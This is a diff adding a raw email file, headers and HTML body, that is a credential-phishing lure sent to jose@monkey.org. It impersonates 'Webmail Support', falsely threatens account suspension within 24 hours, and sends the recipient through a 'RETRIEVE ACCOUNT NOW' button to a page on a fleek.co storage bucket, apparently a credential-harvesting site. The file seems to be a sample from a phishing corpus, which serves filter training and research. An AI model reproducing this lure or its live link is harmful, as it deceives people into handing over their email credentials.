@@ -1,0 +1,181 @@
+Return-Path: controlpanel-emailbn101.noreply@eifka.net
+Delivered-To: jose@monkey.org
+X-FDA: 80171293230.33.8AE75CB
+Received: from slot0.eifka.net (slot0.eifka.net [109.206.243.79])
+	by imf08.b.hostedemail.com (Postfix) with ESMTP id E8DC11804D5D8
+	for <jose@monkey.org>; Fri, 25 Nov 2022 08:30:34 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=dkim; d=eifka.net;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=controlpanel-emailbn101.noreply@eifka.net;
+ bh=RL2NXasPrSNSXqoC+k9byKEe61VvZfALq77mNkuEPgA=; =?utf-8?q?b=3Da6hhffb19NEe?=
+ =?utf-8?q?KxMlH5nmC7cnB81LeSrPT2qRQapnaEH4k3surSO+AS81J3Typha0JvmX2mijyeSe?=
+  
+ nzGtwsJOkm9M9bBAWi2Ct97sLrFc1nIYV7AKMyyOi9mDf11+RsZOhIYB9xM8n23sqSDHKdecX3gg
+  
+ t896c0MRg0IoYCMpYBQXtlrxmre0nLrWu4jjxysc60oVg6ZOwBwkbQ0VW0kLOT/aeV1ubCCskj+G
+  
+ JkY53dmwe0znIg/EP7s8VZ0zzvqk1EMjL0nbXgMiZfX1hurZqJubMfV58oSAH564Bwvfw7UJSm8C
+   ymoojmPyT/qMNoW92Hgq9KJVTUUMtNzkJBOlAw==
+From:
+ "Webmail Support monkey.org"   <controlpanel-emailbn101.noreply@eifka.net>
+To: jose@monkey.org
+Subject: [CASE  ID: KTF-178-OxEoHbxIoE]:IMPORTANT: You have  1 new message(s)
+ in your jose@monkey.org Mailbox
+Date: 25 Nov 2022 00:30:28 -0800
+Message-ID: <20221125003028.EBDFE49B34027452@eifka.net>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+ARC-Authentication-Results: i=1;	imf08.b.hostedemail.com;	dkim=pass
+ header.d=eifka.net header.s=dkim header.b=a6hhffb1;	dmarc=pass (policy=none)
+ header.from=eifka.net;	spf=pass (imf08.b.hostedemail.com: domain of
+ controlpanel-emailbn101.noreply@eifka.net designates 109.206.243.79 as
+ permitted sender) smtp.mailfrom=controlpanel-emailbn101.noreply@eifka.net
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1669365035;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=RL2NXasPrSNSXqoC+k9byKEe61VvZfALq77mNkuEPgA=;
+	b=r/Io2cIzpMDxtC8dNypNj+HrF8sEPx/nApnYu339D/CAUExN0ElwdHw7VbwRfHWTE9kVkf
+	upDyakzE0TqDxm21++Ofh8uIR3IboSwJ1nLnlfwrIMSkDBH4HSJIoDGigsFwa7jZnmJzqn
+	HmsYduTJmZMgJUh9edKuvd0YWv5B63s=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1669365035; a=rsa-sha256;
+	cv=none;
+	b=KwjbYPydDWAUfMPL11T/lqoIkGlEWh6jGj/ZUe0TMdWIXbwxVWMbUjJUMyINM1TdTR07Fr
+	kwxq9QagAKYtXnN5XQ669owy7ysAvsaPF+AA5xJGqQ1G41PxaMfE6kBn3+d28qngW0vrvU
+	gvZF50Ju6ALobzfzU4hd3UzIw+FyXL8=
+Authentication-Results: imf08.b.hostedemail.com;	dkim=pass header.d=eifka.net
+ header.s=dkim header.b=a6hhffb1;	dmarc=pass (policy=none)
+ header.from=eifka.net;	spf=pass (imf08.b.hostedemail.com: domain of
+ controlpanel-emailbn101.noreply@eifka.net designates 109.206.243.79 as
+ permitted sender) smtp.mailfrom=controlpanel-emailbn101.noreply@eifka.net
+X-Rspam-User: 
+X-Spam-Status: Yes, score=14.13
+X-Stat-Signature: cg4en97ngecfn95koiery4a7pnj8ckqo
+X-Rspamd-Queue-Id: E8DC11804D5D8
+X-Rspamd-Server: rspam09
+X-HE-Tag: 1669365034-778365
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 221
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table style=3D"width: 780px; text-align: left; color: rgb(29, 34, 40); tex=
+t-transform: none; letter-spacing: normal; font-family: Roboto, sans-serif;=
+ font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; =
+white-space: normal; border-collapse: collapse; box-sizing: border-box; orp=
+hans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-liga=
+tures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; t=
+ext-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;"><tbody sty=
+le=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td st=
+yle=3D"padding: 30px; border-radius: 5px; -ms-word-break: normal; min-heigh=
+t: 50px; box-sizing: border-box; background-color: rgb(230, 230, 230);"><fo=
+nt size=3D"6" style=3D"box-sizing: border-box;"><b style=3D"font-weight: bo=
+lder; box-sizing: border-box;"><span style=3D"color: rgb(249, 83, 22); box-=
+sizing: border-box;">Webmail&nbsp;</span></b>
+<br style=3D"box-sizing: border-box;"></font><span style=3D"color: rgb(0, 0=
+, 0); box-sizing: border-box;"><br style=3D"box-sizing: border-box;"></span=
+><span style=3D"color: rgb(0, 0, 0); box-sizing: border-box;">Hi jose,</spa=
+n>&nbsp;<br style=3D"box-sizing: border-box;">&nbsp;<br style=3D"box-sizing=
+: border-box;">
+<span style=3D"color: rgb(0, 0, 0); box-sizing: border-box;">Your e-Mail ac=
+count&nbsp;</span>&nbsp;<strong>jose@monkey.org</strong>&nbsp; or<span>&nbs=
+p;</span><b style=3D"font-weight: bolder; box-sizing: border-box;">
+info</b>&nbsp;<span style=3D"color: rgb(0, 0, 0); box-sizing: border-box;">=
+will be disconnected from sending or receiving mail from other users&nbsp;<=
+/span><span style=3D"color: rgb(0, 0, 0); box-sizing: border-box;"><span>&n=
+bsp;</span>because you failed to resolve errors on your mail.</span><span s=
+tyle=3D"color: rgb(0, 0, 0); box-sizing: border-box;"><br style=3D"box-sizi=
+ng: border-box;"><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizi=
+ng: border-box;">
+You have 24 hours to retrieve your account&nbsp;or your account will be sus=
+pended.</p></span>Kindly follow the instructions below to retrieve your Ema=
+il now.&nbsp;<br style=3D"box-sizing: border-box;"><br style=3D"box-sizing:=
+ border-box;"><span style=3D"color: rgb(0, 0, 0); box-sizing: border-box;">=
+<br style=3D"box-sizing: border-box;"></span>
+<a style=3D"background: rgb(70, 139, 252); margin: 2px; padding: 10px; bord=
+er-radius: 3px; color: rgb(255, 255, 255); text-decoration: none; float: le=
+ft; display: block; box-sizing: border-box;" href=3D"https://storageapi.fle=
+ek.co/1ff8d2be-881c-427d-96c4-ba40a3da3b6e-bucket/$!)&$.bn.rex.&()!.html#jo=
+se@monkey.org" target=3D"_blank" rel=3D"noreferrer">RETRIEVE ACCOUNT NOW</a=
+><br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;=
+"><br style=3D"box-sizing: border-box;">
+<br style=3D"box-sizing: border-box;">
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+Regards,<br style=3D"box-sizing: border-box;">jose@monkey.org&nbsp;&nbsp;Te=
+am<br style=3D"box-sizing: border-box;">
+<span=20
+id=3D"v1m_-4073586707394668194gmail-m_2816630307823458481m_-108199853742878=
+1577m_6841360037700439274m_620196009487560908m_1721293047556138143m_7271165=
+664184472303m_-3588157470962885146m_3528938847357552438m_-36436689802841102=
+1m_3386240612496612157m_-484185717131438651m_-2667230418373408975m_17606708=
+33373304784m_3801889082888807496m_2075038924029565206m_-4125571150713251344=
+m_6730663347181104419m_6980724882504985148m_409812059450197905m_29566173086=
+27788765m_3055049698645614911m_-6417517573798907530m
+&#10;&#10;&#10;_63" style=3D"box-sizing: border-box;">
+<span=20
+id=3D"v1m_-4073586707394668194gmail-m_2816630307823458481m_-108199853742878=
+1577m_6841360037700439274m_620196009487560908m_1721293047556138143m_7271165=
+664184472303m_-3588157470962885146m_3528938847357552438m_-36436689802841102=
+1m_3386240612496612157m_-484185717131438651m_-2667230418373408975m_17606708=
+33373304784m_3801889082888807496m_2075038924029565206m_-4125571150713251344=
+m_6730663347181104419m_6980724882504985148m_409812059450197905m_29566173086=
+27788765m_3055049698645614911m_-6417517573798907530m
+&#10;&#10;&#10;_63" style=3D"box-sizing: border-box;">Copyright&nbsp;</span=
+></span><span>&nbsp;</span>
+<span=20
+id=3D"v1m_-4073586707394668194gmail-m_2816630307823458481m_-108199853742878=
+1577m_6841360037700439274m_620196009487560908m_1721293047556138143m_7271165=
+664184472303m_-3588157470962885146m_3528938847357552438m_-36436689802841102=
+1m_3386240612496612157m_-484185717131438651m_-2667230418373408975m_17606708=
+33373304784m_3801889082888807496m_2075038924029565206m_-4125571150713251344=
+m_6730663347181104419m_6980724882504985148m_409812059450197905m_29566173086=
+27788765m_3055049698645614911m_-6417517573798907530m
+&#10;&#10;&#10;_63" style=3D'color: rgb(0, 0, 0); font-family: "new times",=
+ serif; box-sizing: border-box;'>
+<span=20
+id=3D"v1m_-4073586707394668194gmail-m_2816630307823458481m_-108199853742878=
+1577m_6841360037700439274m_620196009487560908m_1721293047556138143m_7271165=
+664184472303m_-3588157470962885146m_3528938847357552438m_-36436689802841102=
+1m_3386240612496612157m_-484185717131438651m_-2667230418373408975m_17606708=
+33373304784m_3801889082888807496m_2075038924029565206m_-4125571150713251344=
+m_6730663347181104419m_6980724882504985148m_409812059450197905m_29566173086=
+27788765m_3055049698645614911m_-6417517573798907530m
+&#10;&#10;&#10;_63" style=3D"box-sizing: border-box;">
+<span=20
+id=3D"v1m_-4073586707394668194gmail-m_2816630307823458481m_-108199853742878=
+1577m_6841360037700439274m_620196009487560908m_1721293047556138143m_7271165=
+664184472303m_-3588157470962885146m_3528938847357552438m_-36436689802841102=
+1m_3386240612496612157m_-484185717131438651m_-2667230418373408975m_17606708=
+33373304784m_3801889082888807496m_2075038924029565206m_-4125571150713251344=
+m_6730663347181104419m_6980724882504985148m_409812059450197905m_29566173086=
+27788765m_3055049698645614911m_-6417517573798907530m
+&#10;&#10;&#10;_63" style=3D"box-sizing: border-box;">
+<span=20
+id=3D"v1m_-4073586707394668194gmail-m_2816630307823458481m_-108199853742878=
+1577m_6841360037700439274m_620196009487560908m_1721293047556138143m_7271165=
+664184472303m_-3588157470962885146m_3528938847357552438m_-36436689802841102=
+1m_3386240612496612157m_-484185717131438651m_-2667230418373408975m_17606708=
+33373304784m_3801889082888807496m_2075038924029565206m_-4125571150713251344=
+m_6730663347181104419m_6980724882504985148m_409812059450197905m_29566173086=
+27788765m_3055049698645614911m_-6417517573798907530m
+&#10;&#10;&#10;_63" style=3D"box-sizing: border-box;">
+<span=20
+id=3D"v1m_-4073586707394668194gmail-m_2816630307823458481m_-108199853742878=
+1577m_6841360037700439274m_620196009487560908m_1721293047556138143m_7271165=
+664184472303m_-3588157470962885146m_3528938847357552438m_-36436689802841102=
+1m_3386240612496612157m_-484185717131438651m_-2667230418373408975m_17606708=
+33373304784m_3801889082888807496m_2075038924029565206m_-4125571150713251344=
+m_6730663347181104419m_6980724882504985148m_409812059450197905m_29566173086=
+27788765m_3055049698645614911m_-6417517573798907530m
+&#10;&#10;&#10;_63" style=3D"box-sizing: border-box;">&copy; 2022&nbsp;</sp=
+an></span></span></span></span></p></td></tr></tbody></table></body></html>=
+
+
